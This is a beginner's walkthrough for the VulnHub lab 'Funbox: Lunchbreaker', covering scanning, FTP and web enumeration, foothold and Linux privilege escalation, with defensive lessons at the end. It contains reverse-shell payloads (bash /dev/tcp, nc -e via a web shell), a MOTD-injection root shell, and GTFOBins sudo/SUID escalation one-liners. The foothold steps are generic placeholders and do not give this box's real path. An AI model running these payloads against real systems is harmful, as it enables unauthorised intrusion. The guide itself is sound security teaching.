# Funbox: Lunchbreaker

| Field | Value |
|---|---|
| Machine | Funbox: Lunchbreaker |
| Difficulty | **3 — Easy** (stated: *Easy*) |
| Author: 1day | 0815R2d2 |
| Released | varies by build |
| VulnHub Entry | https://vulnhub.com/entry/funbox-lunchbreaker,700/ (+#download) |
| Download | https://download.vulnhub.com/funbox/FunboxLunchbreaker.ova (varies by build) |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Linux (varies by build) |

## 0. What you will learn

This lab is designed for total beginners. By completing it, you will learn:

- How to discover a target on your virtual network using `arp-scan` and `nmap`
- How to enumerate network services (FTP, SSH, HTTP) and understand what each reveals
- How to search for hidden files/directories with `gobuster`/`dirb` and interpret results
- How to use common password cracking tools (`hydra`, `john`, `rockyou.txt`) responsibly in a lab
- How to exploit weak credentials and misconfigurations to gain a foothold
- How to escalate privileges by abusing SUID binaries, sudo permissions, or writable paths
- How to document findings and think like a blue team to defend against these attacks

> **Why it works:** Many "beginner" CTF machines replicate real-world mistakes: anonymous FTP access, reused/weak passwords, world-writable files, or overly permissive sudo rules. Spotting these teaches you to prevent them.

## 1. Reconnaissance — finding the target

Before attacking, we need to identify the target's IP address on the local lab network (Host-Only or Internal Network). The example target IP used throughout this lab is `192.168.56.101`.

### 1.1 Add hostname to /etc/hosts (recommended)

Since some tools and URLs reference the box name, add it to your attacker's `/etc/hosts` file. The exact hostname varies by build, but for this lab we can alias the IP to a convenient name.

> **Why it works:** Mapping names to IPs avoids confusion and mirrors real penetration testing workflows.

```bash
sudo nano /etc/hosts
```

Add the following line (adjust if your target IP differs):

```text
192.168.56.101 funbox-lunchbreaker
```

Save and verify:

```bash
ping -c 1 funbox-lunchbreaker
```

### 1.2 Find live hosts

Discover active machines on your network segment.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
```

Look for the IP that matches your VulnHub VM's MAC/vendor (varies by build). Example expected: `192.168.56.101`.

> **Why it works:** ARP scanning reveals Layer 2/Layer 3 mappings without relying solely on ICMP.

### 1.3 Port scan with Nmap

Now scan open TCP ports and services. Be thorough but patient.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sC -sV -T4 192.168.56.101
```

- `-sC`: runs safe default scripts
- `-sV`: detects service/version info
- `-T4`: speeds up scan (safe for local lab)

Sample expected output (actual ports/services vary by build):


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at ...
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
Not shown: 65533 closed/tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd (varies by build)
22/tcp open  ssh     OpenSSH (varies by build)
80/tcp open  http    Apache/2.x (varies by build)
```

> **How to read it:** three ports — `21` FTP, `22` SSH, `80` HTTP. The **service and version**
> columns are what you feed to `searchsploit`. "varies by build" is a reminder that a lab's
> banners change between releases — read **your own** output, not the one in this document.

> **Why it works:** Nmap identifies attack surface: which services are listening and what versions they are.

![nmap scan](images/02-nmap.png)


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

With open ports identified, we enumerate each service for potential entry points.

### 2.1 FTP enumeration (port 21)

Check for anonymous login. Many beginner boxes allow `anonymous:anonymous` or empty creds.

```bash
ftp 192.168.56.101
```

Or use `nc`/`curl` equivalents. Try anonymous:

```bash
ftp -n 192.168.56.101 <<EOF
user anonymous anonymous
ls -la
bye
EOF
```

If successful, download interesting files:

```bash
wget -m --no-passive ftp://anonymous:anonymous@192.168.56.101/
```

> **Why it works:** Misconfigured FTP allowing anonymous read access often leaks credentials, notes, or backups.

![ftp enumeration](images/03-ftp.png)

### 2.2 Web enumeration (port 80)

Browse to `http://192.168.56.101`. Inspect page source, robots.txt, cookies, comments.

```bash
curl -L http://192.168.56.101
```

Directory brute-forcing (use common wordlists; adjust as needed):


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,zip,tar.gz,bak
```

Or `dirsearch`:

```bash
dirsearch -u http://192.168.56.101 -e php,html,txt
```

Look for `/admin`, `/login`, `/backup`, configuration files, or any `.zip`/`.txt` that might contain creds.

> **Why it works:** Hidden endpoints reveal admin panels, backup files, or test scripts left behind.

![web directory scan](images/04-dirb.png)

### 2.3 SSH enumeration (port 22)

Check SSH banner for version info (helps with known vulns, rare on Easy boxes).

```bash
ssh -v 192.168.56.101 2>&1 | head -20
```

If no obvious CVE, focus on credential brute-forcing later only if necessary and allowed by lab rules.

> **Why it works:** SSH is usually hardened; brute force is noisy and often not the intended path on beginner boxes.

## 3. Foothold

Based on enumeration findings (varies by build), the typical path is to find credentials in leaked files or via weak auth, then log in.

### 3.1 Exploit findings

Example flow (adapt to actual findings):
1. Found a note/backup via FTP or web that contains username/password.
2. Found a user hash in a file; cracked with `john` + `rockyou.txt`.
3. Found login form vulnerable to default creds.

> **Why it works:** Human errors (passwords in plaintext, backups in webroot, default creds) are common in practice.

### 3.2 Get initial shell

If SSH creds found (e.g. `user:password`):

```bash
ssh user@192.168.56.101
```

If web RCE found, use reverse shell. Example PHP reverse shell (adjust IP/port):


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# Start listener on attacker
nc -lvnp 4444

# Trigger RCE on target (varies)
curl http://192.168.56.101/shell.php?cmd=nc%20-e%20/bin/bash%20192.168.56.10%204444
```

> **Why it works:** Gaining user-level access is the first major milestone (foothold).

![initial shell](images/05-foothold.png)


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

Now we need to escalate from the initial user to `root`. Check common misconfigurations.

### 4.1 Basic enumeration as user


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)
> ### 📖 Concept — Finding files root executes that *you* can write
>
> This is the classic Linux privilege-escalation question: *is there anything that
> runs with elevated privileges whose contents I control?*
>
> ```bash
> find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" \
>      -not -path "/dev/*" -not -path "/run/*" 2>/dev/null
> find / -type f -perm -ug=rwx 2>/dev/null                    # rwx for user AND group
> find / -xdev -type f -perm -0002 -user root 2>/dev/null      # world-writable, root-owned
> ```
>
> `-perm -0002` tests the **other-write** bit. `-xdev` keeps the search on one
> filesystem so you do not wander into `/proc`.
>
> **High-value targets, in rough order of usefulness:**
>
> | Path | Why |
> | --- | --- |
> | **`/etc/passwd`** | Append a UID-0 account → `su` → root |
> | **`/etc/update-motd.d/*`** | Scripts run **as root on every SSH login** (MOTD injection) |
> | `/etc/sudoers`, `/etc/sudoers.d/*` | Add yourself a `NOPASSWD` rule |
> | `/etc/shadow` | Replace a hash with one you know |
> | `/etc/ld.so.preload` | A library loaded into **every** process, as root |
> | `/etc/crontab`, `/etc/cron.*` | Add a root job |
> | `/etc/exports` | Add `no_root_squash` to an NFS export |
> | root-owned scripts in `/opt`, `/srv`, `/usr/local` | Frequently world-writable by mistake |
> | any user's `~/.ssh/authorized_keys` | Passwordless SSH as them |
>
> **MOTD injection deserves special mention.** On Ubuntu/Debian, `pam_motd` runs every
> script in `/etc/update-motd.d/` during SSH login, historically **as root**. If any
> is writable by you, append a payload and log in again:
>
> ```bash
> echo 'bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"' >> /etc/update-motd.d/00-header
> exit ; ssh user@target      # → root reverse shell
> ```
>
> Use `>>` to **append** — `>` truncates the script and breaks the MOTD, which is how
> you end up wondering why nothing happened. Verify with `tail`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files](../../docs/CONCEPTS.md#156-writable-files-and-directories) ·
> [§15.11 — MOTD injection](../../docs/CONCEPTS.md#1511-motd-injection)

```bash
whoami
id
uname -a
cat /etc/passwd | grep -v nologin
sudo -l
find / -perm -4000 2>/dev/null  # SUID binaries
find / -writable -not -path "*/proc/*" 2>/dev/null | head -20
cat ~/.bash_history 2>/dev/null
```

> **Why it works:** Systematic enumeration reveals privilege escalation vectors quickly.

### 4.2 Common vectors (check which apply)

- **Sudo misconfig**: if `sudo -l` shows commands you can run as root without password, exploit them (e.g. `vim`, `nmap`, `python`, `find`).
- **SUID binaries**: if unusual binary is SUID root, check GTFOBins for exploitation.
- **Writable files**: world-writable cron jobs, scripts run as root, or `/etc/passwd` modification.
- **Kernel exploits**: only if kernel is very old and no other path exists; avoid on Easy boxes unless necessary.

Example (GTFOBins style - adapt to findings):

```bash
# If sudo allows python
sudo python3 -c 'import os; os.system("/bin/bash")'
```

```bash
# If find is SUID
find . -exec /bin/bash -p \; -quit
```

> **Why it works:** Overprivileged binaries or scripts allow users to execute arbitrary commands as root.

### 4.3 Get root shell

Once escalated:

```bash
whoami
id
cat /root/root.txt 2>/dev/null
cat /root/flag.txt 2>/dev/null
ls /root/
```

> **Why it works:** Proof of compromise is reading root's flag.

![root shell](images/06-root.png)

## 5. Summary of vulnerabilities

| Vulnerability | Affected Component | Severity | Exploitation | Impact |
|---|---|---|---|---|
| Anonymous FTP access | FTP (port 21) | Medium-High | Login with anonymous:anonymous, download files | Credential leakage / info disclosure |
| Sensitive files in webroot/FTP | Web/FTP | Medium | Directory brute force or direct access | Reveals creds/backups |
| Weak/default credentials | SSH/Web | High | Brute force/login with found creds | Initial access |
| Privilege escalation vector | SUID/sudo/script | High | GTFOBins / misconfig abuse | Root access |
| Information disclosure | Various | Low-Med | Enumeration | Aids attack chain |

*Note: Exact entries depend on the build — "varies by build".*

## 6. Defensive lessons (blue team)

To prevent these issues in real environments:

- **Disable anonymous FTP** or restrict to chrooted, authenticated users. Audit FTP configs regularly.
- **Never store plaintext credentials** in notes, webroot, or backups. Use password managers/secure vaults.
- **Enforce strong password policy**: no common passwords, use MFA where possible.
- **Harden SSH**: disable password auth if using keys, restrict users via `AllowUsers`, use fail2ban.
- **Avoid permissive sudo**: follow least privilege; no `NOPASSWD` unless strictly justified and audited.
- **Remove SUID** from unnecessary binaries: `chmod u-s <binary>` after review.
- **Secure webroot**: don't leave `.zip`, `.bak`, `.txt` with secrets; use `.htaccess`/auth and scan for artifacts.
- **Patch and harden**: keep services updated, disable unused ports/services.
- **Logging/monitoring**: alert on anonymous logins, brute force attempts, unusual SUID execution, privilege escalations.

> **Why it works:** Understanding offense informs defense — these are exactly the controls attackers look to bypass.

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

Real, helpful references for further learning:

- [VulnHub - Funbox Series](https://www.vulnhub.com/series/funbox,341/)
- [Funbox: Lunchbreaker (VulnHub)](https://vulnhub.com/entry/funbox-lunchbreaker,700/)
- [Nmap Official Documentation](https://nmap.org/docs.html)
- [Gobuster GitHub](https://github.com/OJ/gobuster)
- [Dirsearch GitHub](https://github.com/maurosoria/dirsearch)
- [GTFOBins - Privilege Escalation](https://gtfobins.github.io/)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
- [John the Ripper](https://www.openwall.com/john/)
- [RockYou Wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

## 8. Screenshot checklist

Document your work with clear screenshots for submission/review:

- [ ] `02-nmap.png` — Nmap scan results showing open ports/services
- [ ] `03-ftp.png` — FTP enumeration (anonymous access, listed files)
- [ ] `04-dirb.png` — Web directory brute force findings
- [ ] `05-foothold.png` — Initial shell/access (user level)
- [ ] `06-root.png` — Root shell and proof (flag)

> **Note:** Filenames and exact steps may vary by build. Adapt commands to your environment. All activities should only be performed in an isolated lab network (Host-Only/Internal).